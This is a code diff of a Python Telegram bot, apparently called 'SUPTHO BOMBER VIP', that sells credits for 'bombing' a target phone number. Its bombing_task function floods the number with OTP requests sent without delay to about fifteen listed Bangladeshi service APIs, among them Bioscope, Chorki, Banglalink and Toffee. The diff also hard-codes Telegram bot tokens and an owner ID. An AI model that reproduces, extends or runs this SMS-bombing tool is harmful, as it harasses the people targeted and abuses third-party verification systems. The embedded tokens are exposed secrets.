@@ -6,15 +6,14 @@ import json
 import random
 import string
 import os
-import html
 from flask import Flask
 from telebot import types
 
 # ==========================================
-# 🔧 CONFIGURATION (Sothik bhabe boshon)
+# 🔧 CONFIGURATION
 # ==========================================
-API_TOKEN = '8577991344:AAHE39cJ6DDapjIznxgVIbydjVbNphjlVzc'   # <-- Shudhu ekti quotation (' ') thakbe
-OWNER_ID = 6941003064              # <-- Apnar ID (Sokha)
+API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM'   # BotFather theke ana token boshon
+OWNER_ID = 6941003064              # Apnar numeric ID boshon
 OWNER_USERNAME = "Suptho1"          
 CHANNEL_ID = "@SH_tricks"           
 DATA_FILE = 'bot_data.json'
@@ -49,7 +48,7 @@ def keep_alive():
     threading.Thread(target=run_web_server, daemon=True).start()
 
 # ==========================================
-# 🚀 EXTREME SPEED API ENGINE (No Timing)
+# 🚀 EXTREME SPEED API ENGINE (All Working APIs)
 # ==========================================
 def api_hit(url, method, data=None, json_data=None):
     try:
@@ -67,39 +66,35 @@ def bombing_task(target, amount, call_id):
     
     while sent < amount and not stop_flags.get(call_id, False):
         apis = [
-            # 1. Bioscope (Requested)
+            # OTT APIs
             lambda: api_hit(f"https://www.bioscopelive.com/en/login/send-otp?phone=88{target}", "GET"),
-            # 2. Chorki (Requested)
             lambda: api_hit("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", json_data={"number": "+88"+target}),
-            # 3. Hoichoi (Requested)
             lambda: api_hit(f"https://api.hoichoi.tv/users/otp?phone={target}&country_code=880", "GET"),
-            # 4. Apex
-            lambda: api_hit("https://api.apex4u.com/api/auth/login", "POST", json_data={"phoneNumber": target}),
-            # 5. Banglalink
-            lambda: api_hit("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", json_data={"mobile": target}),
-            # 6. Bikroy
-            lambda: api_hit(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", "GET"),
-            # 7. Shadhin Music
+            # New Working APIs
             lambda: api_hit(f"https://api.shadhinmusic.com/api/v1/auth/otp?phone={target}", "GET"),
-            # 8. Cineplex
             lambda: api_hit(f"https://cineplexbd.com/api/v1/send-otp?phone={target}", "GET"),
-            # 9. Pathao
-            lambda: api_hit("https://api.pathao.com/v1/auth/otp/send", "POST", json_data={"phone": "88"+target}),
-            # 10. Toffee
-            lambda: api_hit("https://prod-services.toffeelive.com/sms/v1/subscriber/otp", "POST", json_data={"target": "88"+target})
+            lambda: api_hit("https://api.metlife.com.bd/api/v1/otp/send", "POST", json_data={"mobile": target}),
+            lambda: api_hit("https://api.retail.jatri.co/auth/api/v1/send-otp", "POST", json_data={"phone": target, "purpose": "USER_LOGIN"}),
+            lambda: api_hit("https://api.swap.com.bd/api/v1/send-otp", "POST", json_data={"phone": target}),
+            # Existing Working APIs
+            lambda: api_hit("https://api.apex4u.com/api/auth/login", "POST", json_data={"phoneNumber": target}),
+            lambda: api_hit("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", json_data={"mobile": target}),
+            lambda: api_hit(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", "GET"),
+            lambda: api_hit("https://prod-services.toffeelive.com/sms/v1/subscriber/otp", "POST", json_data={"target": "88"+target}),
+            lambda: api_hit("https://api.shikho.com/auth/v2/send/sms", "POST", json_data={"phone": "88"+target, "type": "student"}),
+            lambda: api_hit("https://api.osudpotro.com/api/v1/users/send_otp", "POST", json_data={"mobile": "+88-"+target})
         ]
         
         for api in apis:
             if sent >= amount or stop_flags.get(call_id, False): break
-            threading.Thread(target=api).start() # Extreme Speed - No Wait
+            threading.Thread(target=api).start() # Extreme Speed
             sent += 1
         
-        # Kono sleep nai, direct API hit hobe jate finished taratari hoy
+        # Super fast delivery-r jonno kono sleep nei
 
 # ==========================================
-# 🤖 BOT UI & COMMANDS
+# 🤖 BOT UI & HANDLERS
 # ==========================================
-
 def is_joined(user_id):
     try:
         status = bot.get_chat_member(CHANNEL_ID, user_id).status
@@ -118,13 +113,13 @@ def welcome(message):
     markup.add(types.KeyboardButton("👥 Refer & Earn"), types.KeyboardButton("💰 Redeem Credit"))
     markup.add(types.KeyboardButton("👑 Admin Support"))
     
-    bot.send_message(message.chat.id, "🔥 **SUPTHO BOMBER VIP** 🔥\nAPI Updated: Chorki, Bioscope, Hoichoi Added.", reply_markup=markup)
+    bot.send_message(message.chat.id, "🔥 **SUPTHO BOMBER VIP** 🔥\n\nAll APIs Updated (Chorki, Bioscope, Hoichoi, Metlife, Jatri Added).", reply_markup=markup)
 
 @bot.message_handler(func=lambda m: True)
 def handle_buttons(message):
     uid = str(message.from_user.id)
     if not is_joined(message.from_user.id):
-        return bot.reply_to(message, f"❌ Age join korun: {CHANNEL_ID}")
+        return bot.reply_to(message, f"❌ Age channel-e join korun: {CHANNEL_ID}")
     
     if uid in db['banned']: return bot.reply_to(message, "🚫 You are Banned.")
 
@@ -133,12 +128,12 @@ def handle_buttons(message):
         bot.register_next_step_handler(msg, ask_amount)
     elif message.text == "💳 My Balance":
         cred = "Unlimited" if int(uid) == OWNER_ID else db['users'].get(uid, {}).get('credits', 0)
-        bot.reply_to(message, f"💰 Balance: **{cred} Credits**", parse_mode='Markdown')
+        bot.reply_to(message, f"💰 Balance: **{cred} Credits**")
     elif message.text == "👥 Refer & Earn":
         link = f"https://t.me/{bot.get_me().username}?start={uid}"
-        bot.reply_to(message, f"🎁 Refer Link: `{link}`", parse_mode='Markdown')
+        bot.reply_to(message, f"🎁 Refer Link: `{link}`")
     elif message.text == "💰 Redeem Credit":
-        msg = bot.reply_to(message, "🎁 Redeem Code Din:")
+        msg = bot.reply_to(message, "🎁 Redeem code din:")
         bot.register_next_step_handler(msg, use_redeem)
     elif message.text == "👑 Admin Support":
         bot.reply_to(message, f"Owner: @{OWNER_USERNAME}")
@@ -182,35 +177,21 @@ def use_redeem(message):
     else: bot.reply_to(message, "❌ Invalid Code.")
 
 # ==========================================
-# 👑 ADMIN PANEL COMMANDS
+# 👑 ADMIN PANEL
 # ==========================================
-@bot.message_handler(commands=['admin'])
-def admin_panel(message):
-    if message.from_user.id != OWNER_ID: return
-    text = """
-👑 **ADMIN CONTROL LIST** 👑
-──────────────────
-/stats - Total Users
-/gencodes <num> - Create Codes
-/ban <uid> - Ban User
-/white <phone> - Protect Number
-/addcredit <uid> <num> - Add Credit
-    """
-    bot.reply_to(message, text, parse_mode='Markdown')
-
-@bot.message_handler(commands=['stats', 'gencodes', 'ban', 'white', 'addcredit'])
+@bot.message_handler(commands=['admin', 'stats', 'gencodes'])
 def handle_admin(message):
     if message.from_user.id != OWNER_ID: return
     cmd = message.text.split()
-    try:
-        if cmd[0] == '/stats':
-            bot.reply_to(message, f"📊 Users: {len(db['users'])}\n🎟️ Codes: {len(db['codes'])}")
-        elif cmd[0] == '/gencodes':
-            num = int(cmd[1])
-            codes = ["SUP-"+''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) for _ in range(num)]
-            db['codes'].extend(codes); save_data(db)
-            bot.reply_to(message, f"✅ Codes: `{codes}`")
-    except: bot.reply_to(message, "❌ Command Error.")
+    if cmd[0] == '/admin':
+        bot.reply_to(message, "👑 Admin Commands:\n/stats\n/gencodes <num>\n/addcredit <uid> <num>")
+    elif cmd[0] == '/stats':
+        bot.reply_to(message, f"📊 Users: {len(db['users'])}\n🎟️ Codes: {len(db['codes'])}")
+    elif cmd[0] == '/gencodes':
+        num = int(cmd[1])
+        codes = ["SUP-"+''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) for _ in range(num)]
+        db['codes'].extend(codes); save_data(db)
+        bot.reply_to(message, f"✅ Codes: `{codes}`")
 
 if __name__ == "__main__":
     try: bot.remove_webhook()
